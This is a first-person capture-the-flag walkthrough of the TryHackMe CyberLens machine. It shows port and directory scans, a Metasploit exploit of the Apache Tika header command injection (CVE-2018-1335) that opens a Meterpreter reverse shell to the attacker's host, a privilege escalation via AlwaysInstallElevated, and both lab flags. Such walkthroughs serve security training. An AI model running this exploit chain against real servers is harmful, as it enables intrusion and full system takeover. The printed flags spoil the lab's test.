So, simply visit the IP that you get form the machine and you get to a website where you can upload images and get it's metadata.

We do usual stuff, `nmap -sV -sC cyberlens.thm -vv -Pn`
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 19:48 EDT
Nmap scan report for cyberlens.thm (10.201.76.93)
Host is up (0.32s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
80/tcp   open  tcpwrapped
|_http-title: CyberLens: Unveiling the Hidden Matrix
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.57 (Win64)
135/tcp  open  tcpwrapped
139/tcp  open  tcpwrapped
445/tcp  open  tcpwrapped
3389/tcp open  tcpwrapped
|_ssl-date: 2025-07-31T23:57:40+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-31T23:57:26+00:00
| ssl-cert: Subject: commonName=CyberLens
| Not valid before: 2025-07-30T23:43:27
|_Not valid after:  2026-01-29T23:43:27
5985/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=7/31%OT=5985%CT=1%CU=40113%PV=Y%DS=5%DC=T%G=Y%TM=688C0
OS:2F5%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=I%CI=RD%II=I%SS=S%
OS:TS=U)SEQ(SP=104%GCD=1%ISR=10F%TI=RD%CI=RD%II=I%TS=U)SEQ(SP=105%GCD=1%ISR
OS:=10A%TI=RD%CI=RD%II=I%TS=U)SEQ(SP=105%GCD=1%ISR=10C%TI=RD%CI=I%II=RI%TS=
OS:U)SEQ(SP=108%GCD=1%ISR=10A%TI=I%CI=RD%TS=U)OPS(O1=M508NW8NNS%O2=M508NW8N
OS:NS%O3=M508NW8%O4=M508NW8NNS%O5=M508NW8NNS%O6=M508NNS)WIN(W1=FFFF%W2=FFFF
OS:%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M508NW8NNS%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A
OS:=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%D
OS:F=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 5 hops

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-07-31T23:57:30
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   501.15 ms 10.2.0.1
2   ... 4
5   697.25 ms cyberlens.thm (10.201.76.93)

OS and Service detection performed. Please report any incorrect
```

Nothing much directly so we move on to `GoBuster`. Do some path traversal and see if we can find and access any files.
`gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.201.76.93 -e`

This will give us a lot of interesting stuff. More importantly it give us paths such as `/images`, `/js` and `/css`. I think the `/js` would be interesting. `/images` shows images that are being used across the website.
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.76.93
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.201.76.93/.htaccess            (Status: 403) [Size: 199]
http://10.201.76.93/.htpasswd            (Status: 403) [Size: 199]
http://10.201.76.93/Images               (Status: 301) [Size: 235] [--> http://10.201.76.93/Images/]
http://10.201.76.93/aux                  (Status: 403) [Size: 199]
http://10.201.76.93/cgi-bin/             (Status: 403) [Size: 199]
http://10.201.76.93/com3                 (Status: 403) [Size: 199]
http://10.201.76.93/com2                 (Status: 403) [Size: 199]
http://10.201.76.93/com1                 (Status: 403) [Size: 199]
http://10.201.76.93/com4                 (Status: 403) [Size: 199]
http://10.201.76.93/con                  (Status: 403) [Size: 199]
http://10.201.76.93/css                  (Status: 301) [Size: 232] [--> http://10.201.76.93/css/]
http://10.201.76.93/images               (Status: 301) [Size: 235] [--> http://10.201.76.93/images/]
http://10.201.76.93/js                   (Status: 301) [Size: 231] [--> http://10.201.76.93/js/]
http://10.201.76.93/lpt1                 (Status: 403) [Size: 199]
```

`http://10.201.76.93/js/image-extractor.js` here, you can see that there is port **61777** and pat `/meta` that is being used internally.

![[Pasted image 20250731201533.png]]

Accessing this gives you a Apache 1.7 Tika server! Boom. Now let's see if there is any security vulnerability for this version of Apache server!

One google search and we have [RCE (CVE-2018–1335)](https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/)  
and https://www.exploit-db.com/exploits/47208. Now we use the `metasploit` module. It has a module for this CVE so that's convenient!

We can do `searchsploit tika` it will give you the details of all tika exploits that are present on this system. It will tell exact path if you use `-m`. 
```
──(truelyyours㉿kali)-[~/tryhackme/CyberLens]
└─$ searchsploit tika     
------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit)               | windows/remote/47208.rb
Apache Tika-server < 1.18 - Command Injection                                 | windows/remote/46540.py
Joomla! Component com_cartikads 1.0 - Arbitrary File Upload                   | php/webapps/10984.txt
Mitra Informatika Solusindo cart - SQL Injection                              | php/webapps/5214.txt
------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

We can then do `metasploit` exploit as follows:
```bash
msfconsole
use exploit/windows/http/apache_tika_jp2_jscript
set RHOSTS 10.201.76.93
set RPORT 61777
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_kali_ip>
set LPORT <your_listener_port>
exploit
```
Run this and you'll have the reverse shell! Nice!
![[Pasted image 20250731203344.png]]

Go to `C:\Users\CyberLens\Desktop` and the flag is in `user.txt`.
`THM{T1k4-CV3-f0r-7h3-w1n}`

And we have the user flag 🎉😎!

Now we'll try to get root! A quick and dirty `getsystem` from `meterpreter` didn’t work, so I’ll have to get more inventive.

We will do a **Windows Privilege Escalation Awesome Scripts (WinPEAS)**. But again, no need to download anything since this kind of scripts are also available by default as *Exploit Suggester*.
```
msf6 exploit(windows/http/apache_tika_jp2_jscript) > search exploit suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
```

We need only to setup a session using set command and we can run it.

As we are lazy, let’s select the first provided:
`use exploit/windows/local/always_install_elevated`
![[Pasted image 20250731213224.png]]

That is the vulnerability for a regular user to install MSI files with high privileges. More info. Again, we need to setup SESSION and LHOST.
![[Pasted image 20250731212140.png]]

We run it and get in as an admin:
![[Pasted image 20250731212216.png]]

Voila!
![[Pasted image 20250731212449.png]]

`THM{3lev@t3D-4-pr1v35c!}`

Congratulations 🎉😎!
Treat yourself to a glass of crisp God's nector!